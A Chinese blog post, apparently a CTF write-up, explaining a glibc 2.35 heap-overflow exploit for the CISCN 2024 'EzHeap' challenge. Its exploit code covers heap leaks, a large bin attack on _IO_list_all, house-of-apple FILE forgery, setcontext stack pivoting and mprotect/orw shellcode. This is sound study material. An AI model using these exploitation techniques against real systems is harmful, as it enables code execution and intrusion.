@@ -1,0 +1,1536 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,blog,pwn,heap">
+    
+    <meta name="description" content="">
+    <meta name="description" content="内容题目给了一个libcseccomp.so.2，用seccomptools检查发现程序开了seccomp沙盒，只允许orw和mprotect的系统调用。那就意味着要orw读取flag同时还很可能涉及到内存权限修改。 看下字符串发现给的libc是2.35，大部分的常用攻击可能都不好使了 检查程序，保护全开，即使没有full relro也没用因为有沙箱。很简单，就是一个orw+mprotect的沙盒">
+<meta property="og:type" content="article">
+<meta property="og:title" content="How2Heap实战(2)——CISCN2024EzHeap">
+<meta property="og:url" content="http://example.com/2024/08/30/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024-EzHeap/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="内容题目给了一个libcseccomp.so.2，用seccomptools检查发现程序开了seccomp沙盒，只允许orw和mprotect的系统调用。那就意味着要orw读取flag同时还很可能涉及到内存权限修改。 看下字符串发现给的libc是2.35，大部分的常用攻击可能都不好使了 检查程序，保护全开，即使没有full relro也没用因为有沙箱。很简单，就是一个orw+mprotect的沙盒">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-08-30T08:18:04.000Z">
+<meta property="article:modified_time" content="2024-09-01T05:04:19.002Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>How2Heap实战(2)——CISCN2024EzHeap · Zj_W1nd&#39;s BLOG</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- Google tag (gtag.js) -->
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Zj_W1nd's BLOG</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Zj_W1nd&#39;s BLOG</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">How2Heap实战(2)——CISCN2024EzHeap</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                How2Heap实战(2)——CISCN2024EzHeap
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="heap">heap</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="wp">wp</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2024/08/30</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><p>题目给了一个libcseccomp.so.2，用seccomptools检查发现程序开了seccomp沙盒，只允许orw和mprotect的系统调用。那就意味着要orw读取flag同时还很可能涉及到内存权限修改。</p>
+<p>看下字符串发现给的libc是2.35，大部分的常用攻击可能都不好使了</p>
+<p>检查程序，保护全开，即使没有<code>full relro</code>也没用因为有沙箱。很简单，就是一个orw+mprotect的沙盒以及edit不检查size的堆溢出（不过分配和编辑都要求0x500以内大小），没有别的限制。堆块和size都存在一个数组里最多80个堆块。那主要就是看怎么打2.35的glibc了。另外，如果输入的size大于0x500的话程序会从exit退出。</p>
+<h1 id="house-of-apple-一个看起来似乎是通用的ROP链沙箱orw-wp复现"><a href="#house-of-apple-一个看起来似乎是通用的ROP链沙箱orw-wp复现" class="headerlink" title="house of apple 一个看起来似乎是通用的ROP链沙箱orw wp复现"></a>house of apple 一个看起来似乎是通用的ROP链沙箱orw wp复现</h1><p>考虑高版本的常用攻击house of apple。利用一次large bin attack将io_list_all劫持，然后合理配置fs并将vtable改成<code>_IO_wfile_jumps</code>（不唯一），同时将wide_data段改成我们可控的地址。最后在exit触发的时候调用到wide_data-&gt;wvtable-&gt;0x68偏移处指针来实现劫持控制流（控制流劫持思路不唯一，参考<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273832.htm">house_of_apple的初始blog</a>）</p>
+<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><p>最终要实现orw shellcode，sc布局在堆上，那么就同时要mprotect让堆可执行。</p>
+<h2 id="泄露"><a href="#泄露" class="headerlink" title="泄露"></a>泄露</h2><p>沙箱的存在让初始的堆块非常混乱，泄露需要先进行一些堆风水。参考两个wp有两个思路，一种是malloc一个大堆块借助consolidate清空fast和unsortedbin，然后通过溢出和printf 0截断的特性泄露脏数据。另一种就是直接借助切割，不停malloc让unsortedbin里剩下一个last remainder然后借助溢出overlap取出来进行读取。总之我们能借助溢出随意修改size那么泄露不成问题，随便overlap一下应该就行。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># defragment</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    New(<span class="number">0x90</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line"><span class="comment"># 用五次非excact fit且tcache没有的申请将5个unsorted bin块切割后放入smallbin 另外在unsortebin留下一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    New(<span class="number">0x90</span>, <span class="string">b&quot;flag.txt&quot;</span>) <span class="comment"># top 切割</span></span><br><span class="line"></span><br><span class="line">Edit(<span class="number">5</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x90</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xC0</span> * <span class="number">5</span> + <span class="number">0xA1</span>)) </span><br><span class="line"><span class="comment">#溢出size域 64位tcache处理的最大大小然后加0xa1, 即malloc 0x90的chunk真实大小</span></span><br><span class="line">Delete(<span class="number">6</span>) <span class="comment"># 放入unsorted bin</span></span><br><span class="line">New(<span class="number">0x90</span>, <span class="string">&quot;a&quot;</span>)  <span class="comment"># 6 刚刚的6被“切割”，overlap取出，泄露main_arena+96</span></span><br><span class="line">Show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak = uu64() arch glibc2.39 python调用程序会让glibc以其他数开头而非0x7f</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc.address = leak - <span class="number">0x21ACE0</span></span><br><span class="line"></span><br><span class="line">New(<span class="number">0x3B0</span>, <span class="string">b&quot;flag.txt&quot;</span>)  <span class="comment"># 15 将剩下的部分取出来，这里15是一个overlap，我们能写比想象中多的地方</span></span><br><span class="line">Delete(<span class="number">15</span>)</span><br><span class="line">Show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;content:&quot;</span>)</span><br><span class="line">leak_heap = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span> <span class="comment"># 用tcache泄露堆地址，这个0x3b0的chunk在tcache</span></span><br><span class="line">heap_base = leak_heap - <span class="number">0x2000</span></span><br><span class="line">New(<span class="number">0x3B0</span>, <span class="string">b&quot;a&quot;</span>)  <span class="comment"># 15</span></span><br></pre></td></tr></table></figure>
+<h2 id="1-large-bin-attack"><a href="#1-large-bin-attack" class="headerlink" title="1. large bin attack"></a>1. large bin attack</h2><p>这里其实就可以开始考虑最后堆布局的问题了（在空间不够的情况下），幸运的是这道题给了我们很多可以用的堆块（管理数组是80个，0x50大小），所以其实乱了就重新申请就行了（）。</p>
+<p>large bin attack在2.34版本及以上必须让unsorted bin里的chunk比largebin里的chunk小才能进到能触发的分支（glibc只在另一个分支添加了检查，看到有师傅说这个地方就是留一个口子用来测试的不会修复）。公式参考之前的blog：<a target="_blank" rel="noopener" href="https://zjw1nd.github.io/2024/07/26/How2Heap-7-%E2%80%94%E2%80%94Large-Bin-Attack">https://zjw1nd.github.io/2024/07/26/How2Heap-7-%E2%80%94%E2%80%94Large-Bin-Attack</a></p>
+<p>下面的注释其实是待会布局ROP链的时候用的，这个ROP链调了很久才完全懂，第一个找到的真的思路太清晰了  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># large bin attack</span></span><br><span class="line">New(<span class="number">0x200</span>, <span class="string">b&quot;16&quot;</span>)  <span class="comment"># 16   fake rsp</span></span><br><span class="line">New(<span class="number">0x428</span>, <span class="string">b&quot;17&quot;</span>)  <span class="comment"># 17</span></span><br><span class="line">New(<span class="number">0x200</span>, <span class="string">b&quot;18&quot;</span>)  <span class="comment"># 18   flag.txt</span></span><br><span class="line">New(<span class="number">0x418</span>, <span class="string">b&quot;19&quot;</span>)  <span class="comment"># 19</span></span><br><span class="line">New(<span class="number">0x200</span>, <span class="string">b&quot;20&quot;</span>)  <span class="comment"># 20 fake rsp</span></span><br><span class="line"></span><br><span class="line">fake_rsp = heap_base + <span class="number">0x2940</span> + <span class="number">0x10</span> + <span class="number">0x8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+]fake_rsp: <span class="subst">&#123;<span class="built_in">hex</span>(fake_rsp)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">Delete(<span class="number">17</span>) <span class="comment"># 17 0x431 in unsorted bin</span></span><br><span class="line">New(<span class="number">0x438</span>, <span class="string">&quot;new 17&quot;</span>)  <span class="comment"># new 17, old 17 0x431 in large bin（chunk1）</span></span><br><span class="line"></span><br><span class="line">Delete(<span class="number">19</span>) <span class="comment"># 19 0x421 in unsroted bin</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span> * (<span class="number">0x200</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x430</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span> + p64(IO_list_all - <span class="number">0x20</span>) <span class="comment"># bk_nextsize 写入_IO_list_all-0x20</span></span><br><span class="line">Edit(<span class="number">16</span>, payload)</span><br><span class="line"></span><br><span class="line">New(<span class="number">0x438</span>, <span class="string">b&quot;new 19 and large bin attack&quot;</span>)  <span class="comment"># new 19</span></span><br><span class="line"><span class="comment"># 这里用一次large bin attack，在IO_list_all写入了19的地址（chunk2），现在我们有了IO_list_all的写入权限</span></span><br></pre></td></tr></table></figure>
+<p>此时我们拿到了IO_list_all的控制权，它指向此时在unsorted bin中的old 19 块。</p>
+<h2 id="2-伪造-IO-list-all"><a href="#2-伪造-IO-list-all" class="headerlink" title="2. 伪造_IO_list_all"></a>2. 伪造_IO_list_all</h2><p>核心是将vtable修改为wfile的，然后将wdata指向我们可控的区域，最后把wdata-&gt;wvtable-&gt;0x68写为gadget。</p>
+<p>注意这里面涉及到的检查（大部分可以全0绕过，write_ptr&gt;write_base要赋值一下）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">payload = (</span><br><span class="line">    <span class="string">b&quot;./flag\x00\x00&quot;</span></span><br><span class="line">    + <span class="string">b&quot;\x00&quot;</span> * (<span class="number">0x200</span> - <span class="number">8</span>) <span class="comment"># 溢出  padding</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake rdi（即fp），后续调用会将这个filestrust作为参数传入，rdi会指向堆上这里</span></span><br><span class="line">    <span class="comment">#  下面都是io_list_all指向的内容</span></span><br><span class="line">    + p64(<span class="number">0x0</span>) <span class="comment"># flag</span></span><br><span class="line">    + p64(heap_base + <span class="number">0x3190</span> + <span class="number">0x200</span>)  <span class="comment">#&lt;-- fs+8 也就是rdi+8</span></span><br><span class="line">    <span class="comment"># heap+0x3190=old 19(0x421，fs), read_ptr指向io_list_all+0x200</span></span><br><span class="line">)</span><br><span class="line">payload += <span class="built_in">bytes</span>(fs)[<span class="number">0x10</span>:].ljust(<span class="number">0x200</span>, <span class="string">b&quot;\x00&quot;</span>) + p64(  <span class="comment"># 0x200应该是为了保证不冲突随便写的</span></span><br><span class="line">    heap_base + <span class="number">0x3190</span> + <span class="number">0x200</span> + <span class="number">0x8</span>  <span class="comment"># 指向紧挨着的下面一个可写地址</span></span><br><span class="line">)</span><br><span class="line">payload += <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x8</span> + p64(setcontext + <span class="number">61</span>)  <span class="comment"># [rdi+0x28] = setcontext+61 消耗0x10</span></span><br><span class="line"><span class="comment"># &lt;setcontext+61&gt;:      mov    rsp,QWORD PTR [rdx+0xa0] call here!!!</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&quot;\x00&quot;</span> * (<span class="number">0xA0</span> - <span class="number">0x28</span>) + p64(fake_rsp) + p64(ret)<span class="comment"># 0x28算好了，让[rdx+0xa0]指向fake_rsp, fake_rsp里放的是shellcode</span></span><br><span class="line"><span class="comment"># 然后让ret在0x77c88a5b2b0d &lt;setcontext+301&gt;    push   rcx压栈</span></span><br><span class="line">Edit(<span class="number">18</span>, payload)</span><br></pre></td></tr></table></figure>
+<p>yh师傅这个payload涉及了很多东西，静态分析看了半天宣告失败，还得是不停打断点看内存来明白发生了什么。这里先认为它通过一次溢出，伪造好了IO_list_all指向的file结构体。</p>
+<h2 id="3-开启沙盒的orw与ROP链"><a href="#3-开启沙盒的orw与ROP链" class="headerlink" title="3. 开启沙盒的orw与ROP链"></a>3. 开启沙盒的orw与ROP链</h2><blockquote>
+<p>参考<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_29">这篇文章</a>，里面提到了很多在后面用到的东西。<br>其实看了上面这个blog感觉其实是做多了的公式打法，只是给我第一次见带来了很大的震撼。</p>
+</blockquote>
+<p>我们要想执行自己的shellcode需要很多东西，自由度高一点或者方便一点的话我们可以用栈迁移（劫持rsp）加上ROP来进行攻击。这里涉及到很多的跳转，先拿出几个关键的节点说一下。</p>
+<p>首先是万能的gadget setcontext（glibc 2.35）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+61&gt;:      mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">... ; 很多rdx相对寻址控制寄存器的片段</span><br><span class="line">&lt;setcontext+294&gt;    mov    rcx, qword ptr [rdx + 0xa8]</span><br><span class="line">&lt;setcontext+301&gt;    push   rcx</span><br><span class="line">... ;无堆栈操作</span><br><span class="line">&lt;setcontext+334&gt;    ret</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里要说明，glibc 2.29即以后才变成的rdx寻址，原来都是rdi寻址（偏移也是+53）。</p>
+</blockquote>
+<p>那我们要控制rdx，就要用到下面这段magic_gadget（libc_base+0x167420）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000167420 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br></pre></td></tr></table></figure>
+<p>这段gadget可以将rdx变成rdi+0x8然后接着call rdi+0x28. 而要知道我们fsop利用的woverflow最后只传入了一个文件结构体地址的参数。也就是在我们触发劫持控制流的时候rdi会存有io_file结构体的地址！而这是我们堆上的可控的一个地址，这就给了我们机会，通过布局我们理论上就可以劫持rsp到我们想要的堆块上了。</p>
+<h2 id="4-堆块布局"><a href="#4-堆块布局" class="headerlink" title="4. 堆块布局"></a>4. 堆块布局</h2><p>从前往后看，我们的起点是由于rdi保存有fs的信息，要想控制rsp就要控制rdx，控制rdx就要上面的magic_gadget（将rdi相关的值传入rdx）。那么首先我们在fp._wide_data-&gt;_wvtable-&gt;0x68偏移的地方就要放magic_gadget，它是我们调用的起点。</p>
+<p>然后，它会让rdx中保存[rdi+8]，并调用[rdx+0x20]，因此在rdi+0x28，也就是fs+0x28的地方要放下一跳，也就是<code>setcontext+0x61</code>。</p>
+<p>这还没完，我们刚刚提到rdx变成了[rdi+8]，同时我们依赖于它为rsp和下一跳赋值，rsp是[rdx+0xa0]，返回的下一跳是[rdx + 0xa8]。因此fs+8的位置要放一个+0xa0后是fake_rsp, +0xa8后是ret的一个地址。不过堆上我们随便写 所以挑一个风水宝地放上fake_rsp和ret就好。fake_rsp要指向我们写入的mprotect+orw的shellcode。</p>
+<p>然后就有了上面看到的内容，yh师傅选择在刚刚的large堆块后面+0x200来写，其实随便挑地方都可以的。</p>
